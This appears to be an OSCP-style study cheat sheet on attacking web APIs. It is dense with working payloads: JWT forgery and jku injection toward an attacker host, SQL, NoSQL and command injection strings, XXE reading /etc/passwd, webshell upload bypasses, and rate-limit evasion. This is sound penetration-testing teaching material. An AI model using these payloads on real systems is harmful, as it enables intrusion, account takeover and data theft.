# API Attacks — Complete OSCP Methodology

---

## Table of Contents

1. [API Reconnaissance & Discovery](#1-api-reconnaissance--discovery)
2. [API Documentation & Endpoint Enumeration](#2-api-documentation--endpoint-enumeration)
3. [Authentication Attacks](#3-authentication-attacks)
4. [JWT Attacks](#4-jwt-attacks)
5. [BOLA / IDOR — Broken Object-Level Authorization](#5-bola--idor)
6. [BFLA — Broken Function-Level Authorization](#6-bfla--broken-function-level-authorization)
7. [Mass Assignment / Parameter Pollution](#7-mass-assignment--parameter-pollution)
8. [Rate Limiting & Brute-Force](#8-rate-limiting--brute-force)
9. [Server-Side Parameter Pollution (SSPP)](#9-server-side-parameter-pollution)
10. [GraphQL Attacks](#10-graphql-attacks)
11. [SOAP / XML API Attacks](#11-soap--xml-api-attacks)
12. [API Injection (SQLi, CMDi, etc.)](#12-api-injection)
13. [File Upload via API](#13-file-upload-via-api)
14. [API-Specific Filter Bypass](#14-api-specific-filter-bypass)
15. [Escalation to RCE](#15-escalation-to-rce)
16. [Tools Reference](#16-tools-reference)
17. [Master Checklist](#17-master-checklist)
18. [External References](#18-external-references)

---

## 1. API Reconnaissance & Discovery

### Passive Recon

```bash
# Google dorking for API docs
site:target.com inurl:api
site:target.com inurl:swagger
site:target.com inurl:graphql
site:target.com filetype:json
site:target.com intitle:"api documentation"

# Wayback Machine — find old/hidden API endpoints
waybackurls target.com | grep -i "api\|graphql\|v1\|v2\|rest\|json\|xml"

# GitHub search for API keys/endpoints
# Search the org's repos for: "api_key", "apikey", "authorization", "bearer"

# Check JavaScript files for API endpoints
curl -s https://target.com/app.js | grep -oP '["'"'"'](/api/[^"'"'"']+)["'"'"']'
```

### Active Discovery

```bash
# Common API paths — try each
/api
/api/v1
/api/v2
/api/v3
/v1
/v2
/rest
/graphql
/graphiql
/api-docs
/swagger
/swagger.json
/swagger/index.html
/swagger-ui.html
/openapi.json
/openapi.yaml
/.well-known/openapi.json
/api/swagger.json
/api/docs
/api-docs.json
/api/api-docs
/docs
/redoc
/api/health
/api/status
/api/config
/_catalog              # Docker registry
/actuator              # Spring Boot
/actuator/env
/actuator/health

# Fuzz for API endpoints
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints-res.txt \
     -u "https://target.com/FUZZ" -mc 200,201,204,301,302,307,403

# Fuzz with common API wordlists
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u "https://target.com/api/FUZZ" -mc all -fc 404

# Kiterunner — API-specific discovery
kr scan https://target.com -w /path/to/routes-large.kite
```

---

## 2. API Documentation & Endpoint Enumeration

### Reading Swagger/OpenAPI Docs

If you find `/swagger.json` or `/openapi.json`:

```bash
# Download and read the spec
curl -s https://target.com/swagger.json | python3 -m json.tool

# Key things to extract:
# - All endpoints (paths)
# - HTTP methods allowed
# - Parameters expected
# - Authentication requirements
# - Data models (schemas)
# - Admin-only endpoints
```

### HTTP Method Testing

```bash
# For every endpoint, test ALL methods
curl -X GET    https://target.com/api/users/1
curl -X POST   https://target.com/api/users/1
curl -X PUT    https://target.com/api/users/1
curl -X PATCH  https://target.com/api/users/1
curl -X DELETE https://target.com/api/users/1
curl -X OPTIONS https://target.com/api/users/1  # Check allowed methods

# Method override headers (bypass method restrictions)
curl -X POST https://target.com/api/users/1 -H "X-HTTP-Method-Override: DELETE"
curl -X POST https://target.com/api/users/1 -H "X-Method-Override: PUT"
curl -X POST https://target.com/api/users/1 -H "X-HTTP-Method: PATCH"
```

### Version Testing

```bash
# If /api/v2/users exists, try older/newer versions
/api/v1/users      # May have fewer security controls
/api/v3/users      # May be in beta with debug features
/api/v0/users
/api/internal/users
/api/private/users
/api/admin/users
/api/debug/users
/api/test/users
```

---

## 3. Authentication Attacks

### API Key Attacks

```bash
# Test if API works without authentication
curl https://target.com/api/users

# Test with empty/null API key
curl https://target.com/api/users -H "Authorization: "
curl https://target.com/api/users -H "X-API-Key: "
curl https://target.com/api/users -H "Authorization: Bearer null"
curl https://target.com/api/users -H "Authorization: Bearer undefined"

# Brute-force API keys (if short/predictable)
ffuf -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
     -u "https://target.com/api/users" \
     -H "X-API-Key: FUZZ" -fc 401,403

# Check if key is in URL (bad practice = often exploitable)
/api/users?api_key=12345
```

### OAuth / Token Attacks

```bash
# Test token expiration — does it actually expire?
# Save a token, wait past expiry, try again

# Test token scope — does a user token work on admin endpoints?
curl https://target.com/api/admin/users -H "Authorization: Bearer USER_TOKEN"

# Test token reuse after logout — does invalidation work?

# Test refresh token theft — is it in the URL or response body?
```

---

## 4. JWT Attacks

### Decoding JWT

```bash
# JWT has 3 parts: header.payload.signature (base64url encoded)
echo "HEADER_PART" | base64 -d 2>/dev/null
echo "PAYLOAD_PART" | base64 -d 2>/dev/null

# Or use jwt.io (online) or jwt_tool
```

### Attack 1 — Algorithm None

```bash
# Change algorithm to "none" — signature not verified
# Original header: {"alg":"HS256","typ":"JWT"}
# Tampered header: {"alg":"none","typ":"JWT"}

# Base64url encode the header and payload, set signature to empty
# header.payload.

# Also try:
# "alg": "None"
# "alg": "NONE"
# "alg": "nOnE"
```

### Attack 2 — Algorithm Confusion (RS256 → HS256)

```bash
# If the server uses RS256 (asymmetric), switch to HS256 (symmetric)
# Sign the token using the PUBLIC KEY as the HMAC secret
# Server verifies with the same public key = valid signature

# Get the public key
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > pubkey.pem

# Or from JWKS endpoint
curl https://target.com/.well-known/jwks.json

# Sign with jwt_tool
python3 jwt_tool.py <JWT> -X k -pk pubkey.pem
```

### Attack 3 — Weak HMAC Secret (HS256)

```bash
# Brute-force the signing secret
# hashcat
hashcat -a 0 -m 16500 <JWT> /usr/share/wordlists/rockyou.txt

# john
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# jwt_tool
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt

# Once you have the secret, forge any token:
python3 jwt_tool.py <JWT> -S hs256 -p "secret" -I -pc "role" -pv "admin"
```

### Attack 4 — JWK/JKU Header Injection

```bash
# Inject your own key via jwk header parameter
python3 jwt_tool.py <JWT> -X i    # Inject inline JWK

# Inject via jku (JWK Set URL) — point to your server
python3 jwt_tool.py <JWT> -X s -ju "https://ATTACKER/jwks.json"
# Host jwks.json on your server with your public key
```

### Attack 5 — kid Parameter Injection

```bash
# kid = Key ID, used to select which key to verify with
# If kid is used in a file path or SQL query:

# Path traversal — use /dev/null as key (empty = known)
{"kid":"../../../dev/null","alg":"HS256"}
# Sign with empty string as secret

# SQL injection in kid
{"kid":"1' UNION SELECT 'attacker_secret'-- -","alg":"HS256"}
# Sign with 'attacker_secret'

# Command injection in kid
{"kid":"key1|whoami","alg":"HS256"}
```

### jwt_tool Cheatsheet

```bash
# Install
git clone https://github.com/ticarpi/jwt_tool.git
pip3 install -r requirements.txt

# Decode
python3 jwt_tool.py <JWT>

# Tamper claims
python3 jwt_tool.py <JWT> -T                           # Interactive
python3 jwt_tool.py <JWT> -I -pc "role" -pv "admin"    # Change claim

# All known attacks
python3 jwt_tool.py <JWT> -M at                        # Scan mode

# Crack secret
python3 jwt_tool.py <JWT> -C -d wordlist.txt
```

---

## 5. BOLA / IDOR

**Broken Object-Level Authorization** — the #1 API vulnerability.

The API doesn't verify that the requesting user owns the requested object.

### Testing Methodology

```bash
# 1. Log in as User A, note your user ID (e.g., 123)
# 2. Find API calls that reference your ID
GET /api/users/123
GET /api/orders/456
GET /api/documents/789

# 3. Change the ID to another user's
GET /api/users/124          # Sequential
GET /api/orders/457
GET /api/documents/790

# 4. Test with different auth
# - User A's token accessing User B's resources
# - No token at all
# - Expired token
```

### Where to Look

```
/api/users/{id}
/api/users/{id}/profile
/api/users/{id}/orders
/api/orders/{id}
/api/orders/{id}/invoice
/api/documents/{id}
/api/messages/{id}
/api/files/{id}/download
/api/transactions/{id}
```

### ID Formats to Try

```
# Sequential integers
/api/users/1
/api/users/2

# UUIDs (try known UUIDs from other endpoints)
/api/users/550e8400-e29b-41d4-a716-446655440000

# Encoded IDs (base64)
/api/users/MQ==     # base64 of "1"
/api/users/Mg==     # base64 of "2"

# Hashed IDs
/api/users/c4ca4238a0b923820dcc509a6f75849b    # MD5 of "1"
/api/users/c81e728d9d4c2f636f067f89cc14862c    # MD5 of "2"

# Parameter pollution
/api/users?id=123&id=124

# Wrapping in array
{"id": [123, 124]}
```

### Horizontal vs Vertical IDOR

```
Horizontal: User A accesses User B's data (same role)
  → GET /api/users/124 with User A's token

Vertical: Regular user accesses admin resources
  → GET /api/admin/users with regular user's token
  → PUT /api/users/123 {"role": "admin"} with regular user's token
```

---

## 6. BFLA — Broken Function-Level Authorization

Regular user can call admin-only API functions.

```bash
# Find admin endpoints from docs, JS, or guessing
GET  /api/admin/users
POST /api/admin/users
DELETE /api/users/124
PUT  /api/users/124/role
POST /api/admin/config
GET  /api/admin/logs

# Test with regular user's token
curl https://target.com/api/admin/users \
     -H "Authorization: Bearer REGULAR_USER_TOKEN"

# Method-based escalation
# If GET /api/users/123 is allowed but not PUT:
curl -X PUT https://target.com/api/users/123 \
     -H "Authorization: Bearer REGULAR_USER_TOKEN" \
     -H "Content-Type: application/json" \
     -d '{"role":"admin"}'
```

---

## 7. Mass Assignment / Parameter Pollution

### Mass Assignment

The API blindly accepts more parameters than intended:

```bash
# Normal request
POST /api/users
{"username": "hacker", "email": "hacker@evil.com"}

# Mass assignment — add hidden parameters
POST /api/users
{"username": "hacker", "email": "hacker@evil.com", "role": "admin"}
{"username": "hacker", "email": "hacker@evil.com", "isAdmin": true}
{"username": "hacker", "email": "hacker@evil.com", "credits": 99999}
{"username": "hacker", "email": "hacker@evil.com", "verified": true}
{"username": "hacker", "email": "hacker@evil.com", "discount": 100}
```

### How to Find Hidden Parameters

```bash
# 1. Read API docs / Swagger — look at the data model
# 2. Check GET responses for fields you can't set via POST/PUT
# 3. Check error messages — they may reveal parameter names
# 4. Fuzz parameter names

# Arjun — automated parameter discovery
arjun -u https://target.com/api/users -m POST

# Param Miner (Burp extension) — find hidden parameters

# Common hidden params to try
role, admin, isAdmin, is_admin, type, user_type, privilege
verified, active, approved, status, permissions
balance, credits, amount, price, discount
password, token, api_key, secret
```

### HTTP Parameter Pollution

```bash
# Send duplicate parameters — which one does the server use?
# Frontend proxy may use the first, backend the last

GET /api/users?id=123&id=456

POST /api/transfer
amount=100&amount=10000

# Framework-specific behavior:
# PHP:        uses LAST parameter
# ASP.NET:    concatenates with comma
# Node/Express: uses FIRST (or array)
# Python Flask: uses FIRST
# Java Spring: uses FIRST
```

---

## 8. Rate Limiting & Brute-Force

```bash
# Test if rate limiting exists
for i in $(seq 1 100); do
    curl -s -o /dev/null -w "%{http_code}\n" \
         -X POST https://target.com/api/login \
         -d '{"username":"admin","password":"test'$i'"}' \
         -H "Content-Type: application/json"
done

# Bypass rate limiting
# 1. IP rotation headers
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1

# 2. Null bytes or special chars in parameters
{"username": "admin%00", "password": "test"}
{"username": "admin\n", "password": "test"}

# 3. Change HTTP method
# Rate limit on POST but not PUT?

# 4. Different endpoint/path
/api/v1/login vs /api/v2/login vs /API/LOGIN

# 5. Add parameters
/api/login?dummy=1
/api/login?dummy=2
```

---

## 9. Server-Side Parameter Pollution (SSPP)

When the API backend constructs internal API calls using user input:

```bash
# Truncation
POST /api/search
field=username&value=admin%23    # %23 = # — truncates internal query

# Parameter injection
POST /api/search
field=username%26role%3Dadmin    # %26 = & , %3D = = — injects role=admin

# Path injection
GET /api/users/123%2f..%2fadmin  # %2f = / — path traversal in API route

# JSON injection
{"name": "admin\",\"role\":\"admin"}
```

---

## 10. GraphQL Attacks

### Discovery

```bash
# Common GraphQL endpoints
/graphql
/graphiql
/v1/graphql
/api/graphql
/graphql/console
/gql

# Detect GraphQL
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{__typename}"}'
# Response: {"data":{"__typename":"Query"}} = GraphQL confirmed
```

### Introspection (Schema Dump)

```bash
# Full introspection query
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { types { name fields { name type { name kind ofType { name } } } } } }"}'

# Get all types and their fields
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { queryType { fields { name description args { name type { name } } } } } }"}'

# Get mutations
curl -X POST https://target.com/graphql \
     -H "Content-Type: application/json" \
     -d '{"query":"{ __schema { mutationType { fields { name args { name type { name } } } } } }"}'
```

### Attacks

```bash
# IDOR via GraphQL
{user(id: 1) { username email password }}
{user(id: 2) { username email password }}

# Batching (bypass rate limiting)
[
  {"query": "{ login(user:\"admin\", pass:\"pass1\") { token } }"},
  {"query": "{ login(user:\"admin\", pass:\"pass2\") { token } }"},
  {"query": "{ login(user:\"admin\", pass:\"pass3\") { token } }"}
]

# Alias-based batching
{
  a1: login(user:"admin", pass:"pass1") { token }
  a2: login(user:"admin", pass:"pass2") { token }
  a3: login(user:"admin", pass:"pass3") { token }
}

# SQL injection in arguments
{user(name: "admin' OR 1=1--") { username password }}

# Nested queries (DoS / info leak)
{users { posts { comments { author { posts { comments { author { name } } } } } } }}

# Mutation — create admin user
mutation {
  createUser(input: {username: "hacker", password: "pass", role: "admin"}) {
    id username role
  }
}

# Mutation — modify user
mutation {
  updateUser(id: 1, input: {role: "admin"}) {
    id role
  }
}
```

### If Introspection Is Disabled

```bash
# Try field suggestion (autocomplete errors)
{user(id:1){usernameX}}
# Error might say: "Did you mean 'username'?"

# Brute-force field names
# Use Burp Intruder with common field names: id, name, username, email, password, role, etc.

# Tools
# - Clairvoyance: https://github.com/nikitastupin/clairvoyance
# - graphw00f: https://github.com/dolevf/graphw00f
```

---

## 11. SOAP / XML API Attacks

### Detection

```
Content-Type: text/xml
Content-Type: application/soap+xml
WSDL file: ?wsdl or .wsdl extension
```

### XXE via SOAP

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <GetUser>
      <username>&xxe;</username>
    </GetUser>
  </soapenv:Body>
</soapenv:Envelope>
```

### SQL Injection via SOAP

```xml
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <GetUser>
      <username>admin' OR 1=1--</username>
    </GetUser>
  </soapenv:Body>
</soapenv:Envelope>
```

---

## 12. API Injection

All standard injection types work through APIs — just adjust the delivery format:

### SQLi via JSON

```json
{"username": "admin' OR 1=1--", "password": "anything"}
{"search": "test' UNION SELECT NULL,username,password FROM users--"}
{"id": "1 OR 1=1"}
```

### Command Injection via API

```json
{"filename": "report.pdf; whoami"}
{"host": "127.0.0.1; cat /etc/passwd"}
{"url": "http://example.com`id`"}
```

### SSTI via API

```json
{"name": "{{7*7}}"}
{"template": "${7*7}"}
{"message": "<%= 7*7 %>"}
```

### NoSQL Injection

```json
// Authentication bypass
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}

// Data extraction
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}

// Operator injection
{"username": {"$gt": ""}, "password": {"$gt": ""}}

// In query string
?username[$ne]=&password[$ne]=
?username=admin&password[$gt]=
```

---

## 13. File Upload via API

```bash
# Upload webshell via API
curl -X POST https://target.com/api/upload \
     -H "Authorization: Bearer TOKEN" \
     -F "file=@shell.php"

# Bypass extension check — try variations
shell.php.jpg
shell.pHp
shell.php%00.jpg
shell.php;.jpg
shell.php.png
shell.phtml
shell.php5

# Bypass content-type check
curl -X POST https://target.com/api/upload \
     -H "Authorization: Bearer TOKEN" \
     -F "file=@shell.php;type=image/jpeg"

# Check where uploads go
# Response may include the file path/URL
# Access: https://target.com/uploads/shell.php?cmd=id
```

---

## 14. API-Specific Filter Bypass

```bash
# Content-Type switching
# If JSON is filtered, try XML or form-encoded
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded
Content-Type: text/plain

# Unicode normalization
{"username": "admin"}

# Null bytes
{"username": "admin%00"}

# Double encoding
{"path": "%252e%252e%252f"}

# Case manipulation
GET /API/USERS
GET /Api/Users
GET /api/USERS

# Path tricks
/api/users/../admin/users
/api/./admin/./users
/api/users%2f..%2fadmin
```

---

## 15. Escalation to RCE

```
API IDOR → read admin credentials → admin panel → RCE via upload/config
API SQLi → DB dump → credentials → SSH / further access
API CMDi → direct reverse shell
API file upload → webshell → reverse shell → privesc
API mass assignment → make yourself admin → find RCE in admin features
API SSRF → access internal services → cloud metadata → keys → full compromise
JWT forge → impersonate admin → exploit admin functionality
GraphQL mutation → create admin account → access privileged features
```

---

## 16. Tools Reference

| Tool | Purpose |
|---|---|
| **Postman** | Manual API testing, request building |
| **Burp Suite** | Proxy, Intruder for API fuzzing |
| **ffuf** | Endpoint and parameter fuzzing |
| **Arjun** | Hidden parameter discovery |
| **Kiterunner** | API endpoint discovery |
| **jwt_tool** | JWT analysis and exploitation |
| **GraphQLmap** | GraphQL enumeration and exploitation |
| **Clairvoyance** | GraphQL schema recovery without introspection |
| **sqlmap** | SQLi through API parameters |
| **Nuclei** | Automated API vulnerability scanning |
| **wsdl-wizard** | SOAP/WSDL enumeration |

```bash
# Install jwt_tool
git clone https://github.com/ticarpi/jwt_tool.git

# Install Arjun
pip3 install arjun

# Install Kiterunner
# https://github.com/assetnote/kiterunner/releases

# sqlmap with JSON body
sqlmap -r request.txt --level=5 --risk=3
# In request.txt, mark injection with *:
# {"username": "admin*", "password": "test"}
```

---

## 17. Master Checklist

### Reconnaissance

- [ ] Fuzz for API endpoints (`/api/`, `/v1/`, `/graphql`, etc.)
- [ ] Find API documentation (Swagger, OpenAPI, WSDL)
- [ ] Extract endpoints from JavaScript files
- [ ] Check Wayback Machine for old API versions
- [ ] Test all HTTP methods on every endpoint
- [ ] Test older API versions (`/v1/` instead of `/v2/`)
- [ ] Check for debug/internal/admin endpoints

### Authentication

- [ ] Test endpoints without authentication
- [ ] Test with empty/null tokens
- [ ] Test token expiration (reuse expired tokens)
- [ ] Test token scope (user token on admin endpoint)
- [ ] Test token invalidation after logout
- [ ] Brute-force short/weak API keys

### JWT

- [ ] Decode and inspect claims
- [ ] Try `"alg": "none"` attack
- [ ] Try algorithm confusion (RS256 → HS256)
- [ ] Brute-force weak HMAC secrets
- [ ] Test `kid` injection (path traversal, SQLi)
- [ ] Test `jku`/`jwk` header injection

### Authorization (BOLA/IDOR)

- [ ] Change object IDs in every request (sequential, UUID)
- [ ] Access other users' resources with your token
- [ ] Test both horizontal (same role) and vertical (escalate role) access
- [ ] Try encoded/hashed IDs
- [ ] Test parameter pollution (`?id=1&id=2`)

### Authorization (BFLA)

- [ ] Access admin endpoints with regular user token
- [ ] Test privilege escalation via method change
- [ ] Try method override headers

### Mass Assignment

- [ ] Add hidden parameters to POST/PUT requests
- [ ] Try: `role`, `admin`, `isAdmin`, `verified`, `permissions`
- [ ] Check if GET response reveals settable fields

### Injection

- [ ] Test SQLi in all JSON/XML parameters
- [ ] Test NoSQL injection (`$ne`, `$gt`, `$regex`)
- [ ] Test command injection in file/path/URL parameters
- [ ] Test SSTI in template-related parameters
- [ ] Test XXE in XML/SOAP endpoints

### GraphQL

- [ ] Run introspection query
- [ ] Enumerate all queries and mutations
- [ ] Test IDOR on query arguments
- [ ] Test batching for brute-force
- [ ] Test injection in arguments

### Rate Limiting

- [ ] Test if rate limiting exists on login/sensitive endpoints
- [ ] Try IP rotation headers
- [ ] Try different API versions/paths

### General

- [ ] Test for verbose error messages (stack traces, internal paths)
- [ ] Check CORS configuration (`Access-Control-Allow-Origin: *`)
- [ ] Test for SSRF via URL parameters
- [ ] Test file upload endpoints for webshell

---

## 18. External References

- [PayloadsAllTheThings — API Testing](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/API%20Key%20Leaks)
- [PayloadsAllTheThings — GraphQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)
- [PayloadsAllTheThings — NoSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)
- [PayloadsAllTheThings — JWT](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)
- [OWASP API Security Top 10](https://owasp.org/API-Security/editions/2023/en/0x11-t10/)
- [HackTricks — API Pentesting](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/api-pentesting.html)
- [PortSwigger — API Testing](https://portswigger.net/web-security/api-testing)
- [PortSwigger — GraphQL](https://portswigger.net/web-security/graphql)
- [jwt_tool](https://github.com/ticarpi/jwt_tool)
- [Kiterunner](https://github.com/assetnote/kiterunner)
